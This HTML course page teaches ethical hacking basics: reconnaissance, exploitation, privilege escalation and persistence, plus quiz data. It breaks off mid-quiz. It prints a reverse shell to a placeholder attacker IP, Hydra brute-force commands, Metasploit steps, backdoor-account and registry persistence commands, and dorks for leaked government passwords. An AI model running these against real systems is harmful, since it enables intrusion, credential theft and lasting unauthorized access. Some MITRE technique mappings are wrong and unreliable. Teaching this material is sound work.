@@ -1,0 +1,1487 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Week 4: Ethical Hacking Basics</title>
+    <style>
+        :root {
+            --primary: #1a237e;
+            --secondary: #283593;
+            --accent: #3949ab;
+            --light: #e8eaf6;
+            --dark: #0d0f2e;
+            --success: #4caf50;
+            --warning: #ff9800;
+            --danger: #f44336;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background-color: #f5f5f5;
+            color: #333;
+            line-height: 1.6;
+        }
+        
+        header {
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            color: white;
+            padding: 1.5rem;
+            text-align: center;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+        }
+        
+        .header-content {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+        
+        h1 {
+            font-size: 2.2rem;
+            margin-bottom: 0.5rem;
+        }
+        
+        .subtitle {
+            font-size: 1.2rem;
+            opacity: 0.9;
+        }
+        
+        .week-nav {
+            display: flex;
+            justify-content: center;
+            margin-top: 1rem;
+            flex-wrap: wrap;
+        }
+        
+        .week-nav button {
+            background: rgba(255, 255, 255, 0.2);
+            border: none;
+            color: white;
+            padding: 0.5rem 1rem;
+            margin: 0 0.5rem;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        .week-nav button:hover {
+            background: rgba(255, 255, 255, 0.3);
+        }
+        
+        .week-nav button.active {
+            background: white;
+            color: var(--primary);
+            font-weight: bold;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 2rem auto;
+            padding: 0 1rem;
+        }
+        
+        .dashboard {
+            display: grid;
+            grid-template-columns: 1fr 3fr;
+            gap: 1.5rem;
+        }
+        
+        @media (max-width: 768px) {
+            .dashboard {
+                grid-template-columns: 1fr;
+            }
+        }
+        
+        .sidebar {
+            background: white;
+            border-radius: 8px;
+            padding: 1.5rem;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05);
+        }
+        
+        .sidebar h3 {
+            color: var(--primary);
+            margin-bottom: 1rem;
+            padding-bottom: 0.5rem;
+            border-bottom: 2px solid var(--light);
+        }
+        
+        .tools-list {
+            list-style: none;
+        }
+        
+        .tools-list li {
+            padding: 0.5rem 0;
+            border-bottom: 1px solid var(--light);
+        }
+        
+        .tools-list li:last-child {
+            border-bottom: none;
+        }
+        
+        .tools-list li::before {
+            content: "🛠️";
+            margin-right: 0.5rem;
+        }
+        
+        .content {
+            background: white;
+            border-radius: 8px;
+            padding: 1.5rem;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05);
+        }
+        
+        .day-content {
+            display: none;
+        }
+        
+        .day-content.active {
+            display: block;
+            animation: fadeIn 0.5s ease;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        
+        .day-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 1.5rem;
+            padding-bottom: 1rem;
+            border-bottom: 2px solid var(--light);
+        }
+        
+        .day-title {
+            color: var(--primary);
+            font-size: 1.8rem;
+        }
+        
+        .duration {
+            background: var(--light);
+            padding: 0.3rem 0.8rem;
+            border-radius: 20px;
+            font-size: 0.9rem;
+            color: var(--secondary);
+        }
+        
+        .objectives {
+            background: var(--light);
+            padding: 1rem;
+            border-radius: 8px;
+            margin-bottom: 1.5rem;
+        }
+        
+        .objectives h3 {
+            color: var(--primary);
+            margin-bottom: 0.5rem;
+        }
+        
+        .objectives ul {
+            list-style-position: inside;
+        }
+        
+        .objectives li {
+            margin-bottom: 0.5rem;
+        }
+        
+        .section {
+            margin-bottom: 2rem;
+        }
+        
+        .section-title {
+            color: var(--secondary);
+            margin-bottom: 1rem;
+            padding-bottom: 0.5rem;
+            border-bottom: 1px solid var(--light);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .section-actions {
+            display: flex;
+            gap: 0.5rem;
+        }
+        
+        .btn {
+            padding: 0.4rem 0.8rem;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 0.8rem;
+            transition: all 0.3s;
+            text-decoration: none;
+            display: inline-block;
+        }
+        
+        .btn-video {
+            background: var(--accent);
+            color: white;
+        }
+        
+        .btn-quiz {
+            background: var(--warning);
+            color: white;
+        }
+        
+        .btn:hover {
+            opacity: 0.9;
+            transform: translateY(-2px);
+        }
+        
+        .activity {
+            background: #f9f9f9;
+            padding: 1rem;
+            border-left: 4px solid var(--accent);
+            margin: 1rem 0;
+            border-radius: 0 4px 4px 0;
+        }
+        
+        .activity-title {
+            font-weight: bold;
+            margin-bottom: 0.5rem;
+            color: var(--dark);
+        }
+        
+        .code-block {
+            background: #2d2d2d;
+            color: #f8f8f2;
+            padding: 1rem;
+            border-radius: 4px;
+            margin: 1rem 0;
+            overflow-x: auto;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9rem;
+        }
+        
+        .mitre-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 1rem 0;
+        }
+        
+        .mitre-table th, .mitre-table td {
+            border: 1px solid #ddd;
+            padding: 0.5rem;
+            text-align: left;
+        }
+        
+        .mitre-table th {
+            background: var(--primary);
+            color: white;
+        }
+        
+        .mitre-table tr:nth-child(even) {
+            background: var(--light);
+        }
+        
+        .progress-container {
+            margin-top: 2rem;
+            padding: 1rem;
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05);
+        }
+        
+        .progress-title {
+            color: var(--primary);
+            margin-bottom: 1rem;
+        }
+        
+        .progress-bar {
+            height: 10px;
+            background: #e0e0e0;
+            border-radius: 5px;
+            margin-bottom: 1rem;
+            overflow: hidden;
+        }
+        
+        .progress-fill {
+            height: 100%;
+            background: var(--success);
+            width: 0%;
+            transition: width 0.5s ease;
+        }
+        
+        .completion-status {
+            display: flex;
+            justify-content: space-between;
+        }
+        
+        .day-checkbox {
+            display: flex;
+            align-items: center;
+            margin-bottom: 0.5rem;
+        }
+        
+        .day-checkbox input {
+            margin-right: 0.5rem;
+        }
+        
+        /* Modal styles */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .modal-content {
+            background: white;
+            padding: 2rem;
+            border-radius: 8px;
+            width: 90%;
+            max-width: 600px;
+            max-height: 80vh;
+            overflow-y: auto;
+            position: relative;
+        }
+        
+        .close-modal {
+            position: absolute;
+            top: 1rem;
+            right: 1rem;
+            background: none;
+            border: none;
+            font-size: 1.5rem;
+            cursor: pointer;
+            color: var(--dark);
+        }
+        
+        .quiz-question {
+            margin-bottom: 1.5rem;
+            padding-bottom: 1rem;
+            border-bottom: 1px solid #eee;
+        }
+        
+        .quiz-options {
+            margin-top: 0.5rem;
+        }
+        
+        .quiz-option {
+            margin-bottom: 0.5rem;
+        }
+        
+        .quiz-submit {
+            background: var(--primary);
+            color: white;
+            border: none;
+            padding: 0.7rem 1.5rem;
+            border-radius: 4px;
+            cursor: pointer;
+            margin-top: 1rem;
+        }
+        
+        .quiz-result {
+            margin-top: 1rem;
+            padding: 1rem;
+            border-radius: 4px;
+            display: none;
+        }
+        
+        .quiz-success {
+            background: #e8f5e9;
+            color: #2e7d32;
+        }
+        
+        .quiz-error {
+            background: #ffebee;
+            color: #c62828;
+        }
+        
+        footer {
+            text-align: center;
+            padding: 1.5rem;
+            background: var(--dark);
+            color: white;
+            margin-top: 2rem;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="header-content">
+            <h1>Ethical Hacking Basics</h1>
+            <div class="subtitle">Week 4: Kali Linux Setup & Cyber Reconnaissance</div>
+            <div class="week-nav">
+                <button class="nav-btn active" data-day="1">Day 1: Kali Setup & Recon</button>
+                <button class="nav-btn" data-day="2">Day 2: Exploitation & Privilege Escalation</button>
+                <button class="nav-btn" data-day="3">Day 3: Advanced Exploitation</button>
+            </div>
+        </div>
+    </header>
+    
+    <div class="container">
+        <div class="dashboard">
+            <div class="sidebar">
+                <h3>Tools Covered</h3>
+                <ul class="tools-list">
+                    <li>Kali Linux</li>
+                    <li>Nmap</li>
+                    <li>Shodan</li>
+                    <li>theHarvester</li>
+                    <li>Metasploit</li>
+                    <li>Google Dorking</li>
+                    <li>Maltego</li>
+                    <li>Hydra</li>
+                    <li>MITRE ATT&CK Navigator</li>
+                </ul>
+                
+                <h3>Learning Resources</h3>
+                <ul class="tools-list">
+                    <li>Vulnhub</li>
+                    <li>Hack The Box</li>
+                    <li>TryHackMe</li>
+                    <li>MITRE ATT&CK</li>
+                    <li>NIST CSF</li>
+                </ul>
+                
+                <h3>Practice Labs</h3>
+                <ul class="tools-list">
+                    <li>TryHackMe: "OSINT" Room</li>
+                    <li>Hack The Box: Active Recon Labs</li>
+                    <li>Vulnhub: Basic Pentesting</li>
+                </ul>
+            </div>
+            
+            <div class="content">
+                <!-- Day 1 Content -->
+                <div class="day-content active" id="day1">
+                    <div class="day-header">
+                        <h2 class="day-title">Day 1: Kali Linux Setup & Cyber Reconnaissance</h2>
+                        <span class="duration">4 Hours</span>
+                    </div>
+                    
+                    <div class="objectives">
+                        <h3>Learning Objectives</h3>
+                        <ul>
+                            <li>Set up Kali Linux or equivalent systems for reconnaissance</li>
+                            <li>Perform passive OSINT using Google Dorking, Shodan, and theHarvester</li>
+                            <li>Conduct active reconnaissance using Nmap and banner grabbing</li>
+                            <li>Map reconnaissance phases to the MITRE ATT&CK framework and NIST CSF</li>
+                            <li>Understand the relevance of cyber reconnaissance in global cyber operations</li>
+                        </ul>
+                    </div>
+                    
+                    <div class="section">
+                        <h3 class="section-title">
+                            Introduction to Cyber Reconnaissance
+                            <div class="section-actions">
+                                <a href="https://www.youtube.com/embed/4hfO8NZgbc4" target="_blank" class="btn btn-video">Video</a>
+                                <button class="btn btn-quiz" data-quiz="quiz1">Quiz</button>
+                            </div>
+                        </h3>
+                        <p>Cyber reconnaissance is the first phase in most cyberattacks, where adversaries gather information about their target prior to exploitation.</p>
+                        
+                        <div class="activity">
+                            <div class="activity-title">Real-World Case Study: SolarWinds (2020)</div>
+                            <p>Attackers performed passive recon on public repositories, domains, and update mechanisms before injecting malicious code into software updates.</p>
+                        </div>
+                    </div>
+                    
+                    <div class="section">
+                        <h3 class="section-title">
+                            Hands-On: Passive Recon & OSINT Intelligence
+                            <div class="section-actions">
+                                <a href="https://www.youtube.com/embed/XyIoYsAO2Mg" target="_blank" class="btn btn-video">Video</a>
+                                <button class="btn btn-quiz" data-quiz="quiz2">Quiz</button>
+                            </div>
+                        </h3>
+                        
+                        <h4>Google Dorking</h4>
+                        <div class="code-block">
+                            inurl:/view/index.shtml → Find exposed webcams<br>
+                            intitle:"Admin Panel" site:.gov → Unprotected login portals<br>
+                            filetype:sql → Search for leaked database files
+                        </div>
+                        
+                        <h4>Shodan</h4>
+                        <div class="code-block">
+                            port:3389 country:US → Open RDP servers<br>
+                            port:554 has_screenshot:true → Public camera feeds
+                        </div>
+                        
+                        <h4>theHarvester</h4>
+                        <div class="code-block">
+                            theHarvester -d example.com -b google
+                        </div>
+                    </div>
+                    
+                    <div class="section">
+                        <h3 class="section-title">
+                            Active Reconnaissance: Scanning & Enumeration
+                            <div class="section-actions">
+                                <a href="https://www.youtube.com/embed/BWaGnsRirtU" target="_blank" class="btn btn-video">Video</a>
+                                <button class="btn btn-quiz" data-quiz="quiz3">Quiz</button>
+                            </div>
+                        </h3>
+                        
+                        <h4>Nmap Scanning Techniques</h4>
+                        <div class="code-block">
+                            nmap -sn 192.168.1.0/24            # Discover live hosts<br>
+                            nmap -p 22,80,443 target.com       # Specific ports<br>
+                            nmap -A target.com                 # Aggressive scan + OS fingerprinting
+                        </div>
+                        
+                        <h4>Banner Grabbing & Enumeration</h4>
+                        <div class="code-block">
+                            nc -v target.com 80                 # Grab HTTP banner<br>
+                            nmap -sV -p 21,22,80,443 target.com # Service version detection
+                        </div>
+                    </div>
+                    
+                    <div class="section">
+                        <h3 class="section-title">
+                            Mapping to Frameworks: MITRE ATT&CK + NIST CSF
+                            <div class="section-actions">
+                                <a href="https://www.youtube.com/embed/Yxv1suJYMI8" target="_blank" class="btn btn-video">Video</a>
+                                <button class="btn btn-quiz" data-quiz="quiz4">Quiz</button>
+                            </div>
+                        </h3>
+                        
+                        <table class="mitre-table">
+                            <thead>
+                                <tr>
+                                    <th>Recon Technique</th>
+                                    <th>MITRE Tactic</th>
+                                    <th>Technique ID</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr>
+                                    <td>Google Dorking</td>
+                                    <td>Initial Access</td>
+                                    <td>T1592</td>
+                                </tr>
+                                <tr>
+                                    <td>Shodan Enumeration</td>
+                                    <td>External Services</td>
+                                    <td>T1133</td>
+                                </tr>
+                                <tr>
+                                    <td>DNS Enumeration</td>
+                                    <td>Discovery</td>
+                                    <td>T1018</td>
+                                </tr>
+                                <tr>
+                                    <td>Nmap/Port Scanning</td>
+                                    <td>Discovery</td>
+                                    <td>T1046</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+                
+                <!-- Day 2 Content -->
+                <div class="day-content" id="day2">
+                    <div class="day-header">
+                        <h2 class="day-title">Day 2: Exploitation & Privilege Escalation</h2>
+                        <span class="duration">4 Hours</span>
+                    </div>
+                    
+                    <div class="objectives">
+                        <h3>Learning Objectives</h3>
+                        <ul>
+                            <li>Understand MITRE ATT&CK mapping for exploitation</li>
+                            <li>Perform Remote Code Execution (RCE) attacks</li>
+                            <li>Execute privilege escalation on Linux and Windows systems</li>
+                            <li>Conduct credential attacks using Hydra</li>
+                            <li>Implement defensive measures against exploitation</li>
+                        </ul>
+                    </div>
+                    
+                    <div class="section">
+                        <h3 class="section-title">
+                            Introduction to Exploitation
+                            <div class="section-actions">
+                                <a href="https://www.youtube.com/embed/tnWhwavY6Hg" target="_blank" class="btn btn-video">Video</a>
+                                <button class="btn btn-quiz" data-quiz="quiz5">Quiz</button>
+                            </div>
+                        </h3>
+                        <p>Exploitation involves taking advantage of vulnerabilities in systems to gain unauthorized access or control.</p>
+                        
+                        <div class="activity">
+                            <div class="activity-title">Real-World Case Study: Log4Shell (2021)</div>
+                            <p>RCE vulnerability in Apache Log4j library allowed attackers to execute arbitrary code, leading to lateral movement and data exfiltration.</p>
+                        </div>
+                    </div>
+                    
+                    <div class="section">
+                        <h3 class="section-title">
+                            Remote Code Execution (RCE) Lab
+                            <div class="section-actions">
+                                <a href="https://www.youtube.com/embed/4UHpDUzfHz8" target="_blank" class="btn btn-video">Video</a>
+                                <button class="btn btn-quiz" data-quiz="quiz6">Quiz</button>
+                            </div>
+                        </h3>
+                        
+                        <h4>Metasploit Automation</h4>
+                        <div class="code-block">
+                            # Exploit VSFTPD 2.3.4 Backdoor (CVE-2011-2523)<br>
+                            msf6 > use exploit/unix/ftp/vsftpd_234_backdoor<br>
+                            msf6 > set RHOSTS 192.168.1.105<br>
+                            msf6 > exploit
+                        </div>
+                        
+                        <h4>Manual Exploitation</h4>
+                        <div class="code-block">
+                            curl "http://victim.com/shell.php?cmd=id"
+                        </div>
+                    </div>
+                    
+                    <div class="section">
+                        <h3 class="section-title">
+                            Privilege Escalation
+                            <div class="section-actions">
+                                <a href="https://www.youtube.com/embed/es72y2xJj40" target="_blank" class="btn btn-video">Video</a>
+                                <button class="btn btn-quiz" data-quiz="quiz7">Quiz</button>
+                            </div>
+                        </h3>
+                        
+                        <h4>Linux Privilege Escalation</h4>
+                        <div class="code-block">
+                            # SUID Binaries<br>
+                            find / -perm -4000 2>/dev/null<br><br>
+                            
+                            # Kernel Exploit (DirtyPipe Demo)<br>
+                            gcc dirtypipe.c -o exploit && ./exploit
+                        </div>
+                        
+                        <h4>Windows Privilege Escalation</h4>
+                        <div class="code-block">
+                            # Unquoted Service Path<br>
+                            sc config VulnService binPath= "C:\Temp\malicious.exe"<br><br>
+                            
+                            # PowerUp.ps1<br>
+                            Invoke-AllChecks
+                        </div>
+                    </div>
+                    
+                    <div class="section">
+                        <h3 class="section-title">
+                            Credential Attacks
+                            <div class="section-actions">
+                                <a href="https://www.youtube.com/embed/e3EFusPAHBs" target="_blank" class="btn btn-video">Video</a>
+                                <button class="btn btn-quiz" data-quiz="quiz8">Quiz</button>
+                            </div>
+                        </h3>
+                        
+                        <h4>Hydra Brute-Force</h4>
+                        <div class="code-block">
+                            # SSH<br>
+                            hydra -l admin -P rockyou.txt ssh://192.168.1.105 -t 4<br><br>
+                            
+                            # Web Form<br>
+                            hydra -l admin -P passwords.txt 192.168.1.105 http-post-form "/login:user=^USER^&pass=^PASS^"
+                        </div>
+                        
+                        <h4>Defense Demo</h4>
+                        <div class="code-block">
+                            sudo apt install fail2ban
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- Day 3 Content -->
+                <div class="day-content" id="day3">
+                    <div class="day-header">
+                        <h2 class="day-title">Day 3: Advanced Exploitation & Post-Exploitation</h2>
+                        <span class="duration">4 Hours</span>
+                    </div>
+                    
+                    <div class="objectives">
+                        <h3>Learning Objectives</h3>
+                        <ul>
+                            <li>Understand post-exploitation and persistence mechanisms</li>
+                            <li>Establish reverse shells and long-term access on compromised systems</li>
+                            <li>Exfiltrate data and perform privilege escalation with kernel exploits</li>
+                            <li>Utilize advanced OSINT tools like Shodan, Google Dorking & Maltego</li>
+                            <li>Map techniques to MITRE ATT&CK, identifying tactics used by global APTs</li>
+                        </ul>
+                    </div>
+                    
+                    <div class="section">
+                        <h3 class="section-title">
+                            Advanced Adversary Tactics & Cyber Warfare
+                            <div class="section-actions">
+                                <a href="https://www.youtube.com/embed/x4xkc95AHTU" target="_blank" class="btn btn-video">Video</a>
+                                <button class="btn btn-quiz" data-quiz="quiz9">Quiz</button>
+                            </div>
+                        </h3>
+                        <p>Understanding real-world offensive security strategies used by nation-state and APT-level threat actors.</p>
+                        
+                        <div class="activity">
+                            <div class="activity-title">Case Study: SolarWinds Attack</div>
+                            <p>Attackers inserted a backdoor in software updates, maintained lateral movement and evasion for months, targeting U.S. federal agencies and global tech giants.</p>
+                        </div>
+                    </div>
+                    
+                    <div class="section">
+                        <h3 class="section-title">
+                            Hands-On: Reverse Shells & Remote Code Execution (RCE)
+                            <div class="section-actions">
+                                <a href="https://www.youtube.com/embed/4dyixhre9Uw" target="_blank" class="btn btn-video">Video</a>
+                                <button class="btn btn-quiz" data-quiz="quiz10">Quiz</button>
+                            </div>
+                        </h3>
+                        
+                        <h4>Reverse Shells</h4>
+                        <div class="code-block">
+                            # Attacker Setup<br>
+                            nc -lvnp 4444<br><br>
+                            
+                            # Target System (Simulated)<br>
+                            bash -i >& /dev/tcp/[ATTACKER_IP]/4444 0>&1
+                        </div>
+                        
+                        <h4>Metasploit & RCE Exploits</h4>
+                        <div class="code-block">
+                            use exploit/multi/http/php_exec<br>
+                            set RHOST [target_ip]<br>
+                            set payload linux/x86/meterpreter/reverse_tcp<br>
+                            exploit
+                        </div>
+                    </div>
+                    
+                    <div class="section">
+                        <h3 class="section-title">
+                            Persistence & Privilege Escalation
+                            <div class="section-actions">
+                                <a href="https://www.youtube.com/embed/9wQm6jeWWgg" target="_blank" class="btn btn-video">Video</a>
+                                <button class="btn btn-quiz" data-quiz="quiz11">Quiz</button>
+                            </div>
+                        </h3>
+                        
+                        <h4>Windows Persistence Techniques</h4>
+                        <div class="code-block">
+                            reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v backdoor /t REG_SZ /d "C:\malware.exe"<br><br>
+                            
+                            net user backdoor Pass123! /add<br>
+                            net localgroup administrators backdoor /add
+                        </div>
+                        
+                        <h4>Kernel Exploits for Privilege Escalation (Linux)</h4>
+                        <div class="code-block">
+                            wget http://exploit-db.com/exploits/kernel_exploit.c<br>
+                            gcc kernel_exploit.c -o root<br>
+                            ./root
+                        </div>
+                    </div>
+                    
+                    <div class="section">
+                        <h3 class="section-title">
+                            OSINT for Advanced Targeting
+                            <div class="section-actions">
+                                <a href="https://www.youtube.com/embed/aD-U2kP0vNk" target="_blank" class="btn btn-video">Video</a>
+                                <button class="btn btn-quiz" data-quiz="quiz12">Quiz</button>
+                            </div>
+                        </h3>
+                        
+                        <h4>Shodan</h4>
+                        <div class="code-block">
+                            shodan search "port:502 Modbus"<br>
+                            shodan search "Netgear port:80"
+                        </div>
+                        
+                        <h4>Google Dorking (GHDB) & Maltego CTI</h4>
+                        <div class="code-block">
+                            site:.gov filetype:xls intext:"password"<br>
+                            site:.edu filetype:sql intext:"admin"
+                        </div>
+                    </div>
+                    
+                    <div class="section">
+                        <h3 class="section-title">
+                            MITRE ATT&CK Mapping
+                            <div class="section-actions">
+                                <a href="https://www.youtube.com/embed/WmQPtk3Ybxs"_blank" class="btn btn-video">Video</a>
+                                <button class="btn btn-quiz" data-quiz="quiz13">Quiz</button>
+                            </div>
+                        </h3>
+                        
+                        <table class="mitre-table">
+                            <thead>
+                                <tr>
+                                    <th>Technique</th>
+                                    <th>MITRE ID</th>
+                                    <th>Description</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr>
+                                    <td>Command Execution</td>
+                                    <td>T1059</td>
+                                    <td>Execution of commands on target systems</td>
+                                </tr>
+                                <tr>
+                                    <td>Valid Accounts</td>
+                                    <td>T1078</td>
+                                    <td>Use of legitimate credentials for access</td>
+                                </tr>
+                                <tr>
+                                    <td>Obfuscation</td>
+                                    <td>T1027</td>
+                                    <td>Techniques to hide malicious activity</td>
+                                </tr>
+                                <tr>
+                                    <td>System Discovery</td>
+                                    <td>T1033</td>
+                                    <td>Gathering information about target systems</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="progress-container">
+            <h3 class="progress-title">Week 4 Progress</h3>
+            <div class="progress-bar">
+                <div class="progress-fill" id="progress-fill"></div>
+            </div>
+            <div class="completion-status">
+                <div class="day-checkbox">
+                    <input type="checkbox" id="day1-check" data-day="1">
+                    <label for="day1-check">Day 1: Kali Setup & Recon</label>
+                </div>
+                <div class="day-checkbox">
+                    <input type="checkbox" id="day2-check" data-day="2">
+                    <label for="day2-check">Day 2: Exploitation & Privilege Escalation</label>
+                </div>
+                <div class="day-checkbox">
+                    <input type="checkbox" id="day3-check" data-day="3">
+                    <label for="day3-check">Day 3: Advanced Exploitation</label>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Quiz Modal -->
+    <div class="modal" id="quiz-modal">
+        <div class="modal-content">
+            <button class="close-modal">&times;</button>
+            <div id="quiz-content">
+                <!-- Quiz content will be inserted here -->
+            </div>
+        </div>
+    </div>
+    
+    <footer>
+        <p>Ethical Hacking Basics - Week 4 | Cybersecurity Masterclass</p>
+    </footer>
+
+    <script>
+        // Quiz data
+        const quizzes = {
+            quiz1: {
+                title: "Introduction to Cyber Reconnaissance",
+                questions: [
+                    {
+                        question: "What is the primary goal of cyber reconnaissance?",
+                        options: [
+                            "To exploit vulnerabilities in systems",
+                            "To gather information about a target before attacking",
+                            "To defend against cyber attacks",
+                            "To create malware for attacks"
+                        ],
+                        correct: 1
+                    },
+                    {
+                        question: "Which of these is an example of passive reconnaissance?",
+                        options: [
+                            "Port scanning with Nmap",
+                            "Google Dorking for exposed documents",
+                            "Banner grabbing from services",
+                            "Vulnerability scanning"
+                        ],
+                        correct: 1
+                    },
+                    {
+                        question: "In the SolarWinds attack, what method did attackers use to initially compromise systems?",
+                        options: [
+                            "Phishing emails",
+                            "Malicious software updates",
+                            "Brute force attacks",
+                            "Social engineering"
+                        ],
+                        correct: 1
+                    }
+                ]
+            },
+            quiz2: {
+                title: "Passive Recon & OSINT Intelligence",
+                questions: [
+                    {
+                        question: "What does the Google Dork 'filetype:sql' help find?",
+                        options: [
+                            "SQL injection vulnerabilities",
+                            "Database administration panels",
+                            "Exposed SQL database files",
+                            "SQL server login pages"
+                        ],
+                        correct: 2
+                    },
+                    {
+                        question: "Which Shodan search would help find exposed RDP servers in the US?",
+                        options: [
+                            "port:22 country:US",
+                            "port:80 has_screenshot:true",
+                            "port:3389 country:US",
+                            "port:443 org:Microsoft"
+                        ],
+                        correct: 2
+                    },
+                    {
+                        question: "What information does theHarvester primarily collect?",
+                        options: [
+                            "Open ports on target systems",
+                            "Email addresses and subdomains",
+                            "Vulnerabilities in web applications",
+                            "Network traffic patterns"
+                        ],
+                        correct: 1
+                    }
+                ]
+            },
+            quiz3: {
+                title: "Active Reconnaissance: Scanning & Enumeration",
+                questions: [
+                    {
+                        question: "What does the Nmap command 'nmap -sn 192.168.1.0/24' do?",
+                        options: [
+                            "Scans all ports on the network",
+                            "Performs OS fingerprinting on hosts",
+                            "Discovers live hosts on the network",
+                            "Scans for specific services"
+                        ],
+                        correct: 2
+                    },
+                    {
+                        question: "Which Nmap flag enables aggressive scanning?",
+                        options: [
+                            "-A",
+                            "-sS",
+                            "-O",
+                            "-T4"
+                        ],
+                        correct: 0
+                    },
+                    {
+                        question: "What is the purpose of banner grabbing?",
+                        options: [
+                            "To identify open ports on a system",
+                            "To determine service versions and information",
+                            "To map network topology",
+                            "To identify operating systems"
+                        ],
+                        correct: 1
+                    }
+                ]
+            },
+            quiz4: {
+                title: "Mapping to Frameworks: MITRE ATT&CK + NIST CSF",
+                questions: [
+                    {
+                        question: "Which MITRE ATT&CK technique ID corresponds to Google Dorking?",
+                        options: [
+                            "T1592",
+                            "T1046",
+                            "T1018",
+                            "T1133"
+                        ],
+                        correct: 0
+                    },
+                    {
+                        question: "Port scanning with Nmap maps to which MITRE ATT&CK tactic?",
+                        options: [
+                            "Initial Access",
+                            "Execution",
+                            "Discovery",
+                            "Persistence"
+                        ],
+                        correct: 2
+                    },
+                    {
+                        question: "Which NIST CSF function involves developing organizational understanding?",
+                        options: [
+                            "Identify",
+                            "Protect",
+                            "Detect",
+                            "Respond"
+                        ],
+                        correct: 0
+                    }
+                ]
+            },
+            quiz5: {
+                title: "Introduction to Exploitation",
+                questions: [
+                    {
+                        question: "What does RCE stand for in cybersecurity?",
+                        options: [
+                            "Remote Code Execution",
+                            "Runtime Code Evaluation",
+                            "Recursive Command Execution",
+                            "Real-time Code Encryption"
+                        ],
+                        correct: 0
+                    },
+                    {
+                        question: "Which vulnerability was exploited in the Log4Shell attack?",
+                        options: [
+                            "Apache Struts",
+                            "Apache Log4j",
+                            "VSFTPD backdoor",
+                            "Dirty Pipe"
+                        ],
+                        correct: 1
+                    },
+                    {
+                        question: "In MITRE ATT&CK, what tactic does RCE typically fall under?",
+                        options: [
+                            "Initial Access",
+                            "Execution",
+                            "Persistence",
+                            "Privilege Escalation"
+                        ],
+                        correct: 1
+                    }
+                ]
+            },
+            quiz6: {
+                title: "Remote Code Execution (RCE) Lab",
+                questions: [
+                    {
+                        question: "What is the primary advantage of using Metasploit for exploitation?",
+                        options: [
+                            "It's completely undetectable",
+                            "It automates the exploitation process",
+                            "It only works on Windows systems",
+                            "It doesn't require any technical knowledge"
+                        ],
+                        correct: 1
+                    },
+                    {
+                        question: "Which CVE is associated with the VSFTPD backdoor vulnerability?",
+                        options: [
+                            "CVE-2017-5638",
+                            "CVE-2021-44228",
+                            "CVE-2011-2523",
+                            "CVE-2019-0708"
+                        ],
+                        correct: 2
+                    },
+                    {
+                        question: "What is a potential disadvantage of manual exploitation compared to automated tools?",
+                        options: [
+                            "It's more difficult to execute",
+                            "It's less reliable",
+                            "It requires more technical knowledge",
+                            "All of the above"
+                        ],
+                        correct: 3
+                    }
+                ]
+            },
+            quiz7: {
+                title: "Privilege Escalation",
+                questions: [
+                    {
+                        question: "What does the command 'find / -perm -4000 2>/dev/null' help identify?",
+                        options: [
+                            "World-writable files",
+                            "SUID binaries",
+                            "Kernel vulnerabilities",
+                            "Hidden directories"
+                        ],
+                        correct: 1
+                    },
+                    {
+                        question: "Which tool is commonly used for Windows privilege escalation enumeration?",
+                        options: [
+                            "LinPEAS",
+                            "WinPEAS",
+                            "Metasploit",
+                            "Nmap"
+                        ],
+                        correct: 1
+                    },
+                    {
+                        question: "What is an unquoted service path vulnerability?",
+                        options: [
+                            "A service running with excessive privileges",
+                            "A service path containing spaces without quotes",
+                            "A service with weak authentication",
+                            "A service vulnerable to buffer overflow"
+                        ],
+                        correct: 1
+                    }
+                ]
+            },
+            quiz8: {
+                title: "Credential Attacks",
+                questions: [
+                    {
+                        question: "What type of attack does Hydra primarily perform?",
+                        options: [
+                            "SQL injection",
+                            "Brute force",
+                            "Social engineering",
+                            "DNS spoofing"
+                        ],
+                        correct: 1
+                    },
+                    {
+                        question: "Which defensive tool can help protect against brute force attacks?",
+                        options: [
+                            "Nmap",
+                            "Fail2ban",
+                            "Metasploit",
+                            "theHarvester"
+                        ],
+                        correct: 1
+                    },
+                    {
+                        question: "What is the '-t' flag used for in Hydra?",
+                        options: [
+                            "Specify target IP",
+                            "Set number of parallel tasks",
+                            "Define timeout value",
+                            "Select attack type"
+                        ],
+                        correct: 1
+                    }
+                ]
+            },
+            quiz9: {
+                title: "Advanced Adversary Tactics & Cyber Warfare",
+                questions: [
+                    {
+                        question: "What does APT stand for in cybersecurity?",
+                        options: [
+                            "Advanced Penetration Testing",
+                            "Automated Persistent Threat",
+                            "Advanced Persistent Threat",
+                            "Application Protocol Testing"
+                        ],
+                        correct: 2
+                    },
+                    {
+                        question: "In the SolarWinds attack, how did attackers maintain persistence?",
+                        options: [
+                            "Through scheduled tasks",
+                            "Via registry modifications",
+                            "Through backdoored software updates",
